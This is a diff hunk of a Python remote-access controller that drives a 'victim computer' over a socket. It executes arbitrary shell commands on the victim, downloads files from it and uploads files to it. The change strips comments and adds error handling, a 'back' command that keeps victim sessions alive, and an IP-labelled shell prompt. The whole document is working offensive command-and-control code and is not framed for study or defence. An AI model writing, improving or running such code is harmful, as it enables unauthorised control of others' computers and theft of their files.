@@ -95,56 +95,90 @@ def run(target, ip):
     # ------------------
     # Mini-function inside run: send
     # ------------------
-    # Sends a message to the victim computer
     def send(data):
-        json_data = json.dumps(data)                # Package the data in JSON format
-        target.send(json_data.encode('utf-8'))      # Convert to bytes and send it over the network
+        json_data = json.dumps(data)
+        target.send(json_data.encode('utf-8'))
 
     # ------------------
     # Mini-function inside run: recieve
     # ------------------
-    # Receives a message from the victim computer
-    # Sometimes messages come in pieces, so we keep collecting until we have the complete message
     def recieve():
-        json_data = ''                                      # Start with an empty message
-        while True:                                         # Keep trying until we get a complete message
+        json_data = ''
+        while True:
             try:
-                json_data += target.recv(1024).decode('utf-8')  # Receive up to 1024 bytes and add to our message
-                return json.loads(json_data)                    # Try to convert from JSON - if it works, we're done!
-            except ValueError:                                  # If JSON conversion fails, message is incomplete
-                continue                                        # Keep looping to get more data
+                json_data += target.recv(1024).decode('utf-8')
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    # ------------------
+    # Display session header
+    # ------------------
+    print(GREEN + f'\n[+] Connected to Session at {ip[0]}' + RESET)
+    print(YELLOW + "[+] Type 'help' for available commands, 'back' to return to Command Center" + RESET)
 
     # ------------------
     # Main interaction loop
     # ------------------
-    # This is where you type commands and see the results!
     while True:
-        command = input('Shell#: ')                         # Show prompt and wait for you to type a command
+        command = input(f'Shell#{ip[0]}: ')  # More descriptive prompt
         
-        if command == 'help':                               # If you typed 'help'
-            show_shell_help()                               # Display the shell help menu
-            continue                                        # Don't send 'help' to the victim, just show menu
+        if command.strip() == '':  # Ignore empty commands
+            continue
         
-        send(command)                                       # Send your command to the victim computer
+        if command == 'help':
+            show_shell_help()
+            continue
         
-        if command == 'exit':                               # If you typed 'exit'
-            break                                           # Stop controlling this victim and go back to main menu
+        if command == 'back':  # NEW: Return to Command Center without killing victim
+            print(YELLOW + '[+] Returning to Command Center...' + RESET)
+            break
         
-        elif command[:2] == 'cd' and len(command) > 1:      # If you typed 'cd' (change directory)
-            continue                                        # cd doesn't give output, so just continue to next command
+        send(command)
         
-        elif command[:8] == 'download':                     # If you typed 'download filename'
-            with open(command[9:], 'wb') as file:           # Create a new file on YOUR computer (the filename you specified)
-                file_data = recieve()                       # Get the file data from the victim
-                file.write(base64.b64decode(file_data))     # Decode the data and save it to your file
+        if command == 'exit':
+            print(YELLOW + '[!] Closing victim connection...' + RESET)
+            break
         
-        elif command[:6] == 'upload':                       # If you typed 'upload filename'
-            with open(command[7:], 'rb') as file:           # Open the file from YOUR computer
-                send(base64.b64encode(file.read()).decode('utf-8'))  # Read it, encode it, and send to victim
+        elif command[:2] == 'cd' and len(command) > 1:
+            # For cd, we still need to receive the response (even if empty)
+            # to stay in sync
+            try:
+                result = recieve()
+                if result:  # Only print if there's an error message
+                    print(result)
+            except:
+                pass
         
-        else:                                               # For any other command (like 'ls', 'whoami', etc.)
-            result = recieve().encode('utf-8')              # Get the command output from the victim
-            print(result.decode('utf-8'))                   # Display the output on your screen
+        elif command[:8] == 'download':
+            try:
+                file_data = recieve()
+                with open(command[9:], 'wb') as file:
+                    file.write(base64.b64decode(file_data))
+                print(GREEN + f'[+] File downloaded: {command[9:]}' + RESET)
+            except Exception as e:
+                print(RED + f'[-] Download failed: {str(e)}' + RESET)
+        
+        elif command[:6] == 'upload':
+            try:
+                with open(command[7:], 'rb') as file:
+                    send(base64.b64encode(file.read()).decode('utf-8'))
+                result = recieve()  # Get confirmation from victim
+                print(GREEN + f'[+] File uploaded: {command[7:]}' + RESET)
+            except FileNotFoundError:
+                print(RED + f'[-] File not found: {command[7:]}' + RESET)
+            except Exception as e:
+                print(RED + f'[-] Upload failed: {str(e)}' + RESET)
+        
+        else:
+            try:
+                result = recieve()
+                if isinstance(result, str):
+                    print(result)
+                else:
+                    print(str(result))
+            except Exception as e:
+                print(RED + f'[-] Error receiving response: {str(e)}' + RESET)
 
 
 # ============================================================================================
